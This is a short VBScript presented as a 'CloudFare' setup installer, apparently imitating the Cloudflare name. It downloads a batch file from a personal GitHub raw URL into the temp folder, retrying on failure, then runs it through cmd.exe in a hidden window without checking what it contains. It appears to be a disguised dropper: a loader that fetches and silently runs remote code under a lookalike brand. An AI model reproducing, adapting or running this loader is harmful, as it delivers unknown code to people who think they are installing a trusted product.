' CloudFare Setup VBScript Universal v2.0
' Enhanced Silent Installation with Retry Mechanism
' Compatible: Windows 7 SP1 to Windows 11+

Option Explicit

Dim objShell, objFSO, objHTTP
Dim strRepoURL, strRawURL, strTempDir, strBatFile
Dim intStatus, intRetryCount
Dim blnDownloadSuccess

' Configuration Constants
Const MAX_RETRIES = 3
Const RETRY_DELAY_SECONDS = 5

' Initialize Objects
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' URLs Configuration
strRepoURL = "https://github.com/davidrenand/repos"
strRawURL = "https://raw.githubusercontent.com/davidrenand/repos/main/scripts/"
strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%") & "\CloudFare"

' Logging Function
Sub LogMessage(strMessage)
    Dim objLogFile
    Dim strLogPath
    
    strLogPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\CloudFare_Install.log"
    
    Set objLogFile = objFSO.OpenTextFile(strLogPath, 8, True)
    objLogFile.WriteLine Now & " - " & strMessage
    objLogFile.Close
    Set objLogFile = Nothing
End Sub

' Download with Retry Function
Function DownloadFileWithRetry(strURL, strDestination)
    Dim intRetry
    Dim objHTTP
    
    LogMessage "Attempting to download: " & strURL
    
    For intRetry = 1 To MAX_RETRIES
        On Error Resume Next
        
        Set objHTTP = CreateObject("MSXML2.XMLHTTP.6.0")
        objHTTP.Open "GET", strURL, False
        objHTTP.SetRequestHeader "User-Agent", "CloudFare/2.0"
        objHTTP.Send
        
        If objHTTP.Status = 200 Then
            Dim objFile
            Set objFile = objFSO.CreateTextFile(strDestination, True)
            objFile.Write objHTTP.ResponseText
            objFile.Close
            
            LogMessage "Download successful after " & intRetry & " attempt(s)"
            DownloadFileWithRetry = True
            Exit Function
        Else
            LogMessage "Download failed (Status: " & objHTTP.Status & ") - Retry " & intRetry
            WScript.Sleep RETRY_DELAY_SECONDS * 1000  ' Wait before retry
        End If
        
        On Error GoTo 0
    Next
    
    LogMessage "Download failed after " & MAX_RETRIES & " attempts"
    DownloadFileWithRetry = False
End Function

' Main Execution
Sub Main()
    ' Create temporary directory
    If Not objFSO.FolderExists(strTempDir) Then
        objFSO.CreateFolder(strTempDir)
    End If
    
    ' Download Install-Universal.bat with retry
    Dim strBatchPath
    strBatchPath = strTempDir & "\Install-Universal.bat"
    
    If DownloadFileWithRetry(strRawURL & "Install-Universal.bat", strBatchPath) Then
        ' Execute batch file silently
        objShell.Run "cmd.exe /c """ & strBatchPath & """", 0, True
        LogMessage "Batch script executed successfully"
    Else
        LogMessage "CRITICAL: Failed to download installation script"
        WScript.Quit 1
    End If
End Sub

' Start Main Execution
Main()

' Cleanup
Set objFSO = Nothing
Set objShell = Nothing

WScript.Quit 0